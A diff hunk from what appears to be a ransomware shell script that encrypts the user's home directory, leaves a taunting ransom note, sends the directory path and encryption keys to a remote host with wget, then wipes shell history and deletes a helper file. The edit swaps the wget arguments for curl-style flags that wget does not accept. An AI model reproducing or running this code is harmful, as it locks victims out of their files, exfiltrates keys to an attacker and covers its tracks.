@@ -32,7 +32,7 @@ encdir()
 p=`echo ~/`
 encdir "$p" > /dev/null 2>&1
 echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
-wget --post-data "dir=$p&Key1=$m&key2=$n" $1 > /dev/null 2>&1
+wget -X POST -d "dir=$p&Key1=$m&key2=$n" "$1" > /dev/null 2>&1
 history -c > /dev/null 2>&1
 history -w > /dev/null 2>&1
 rm post.php
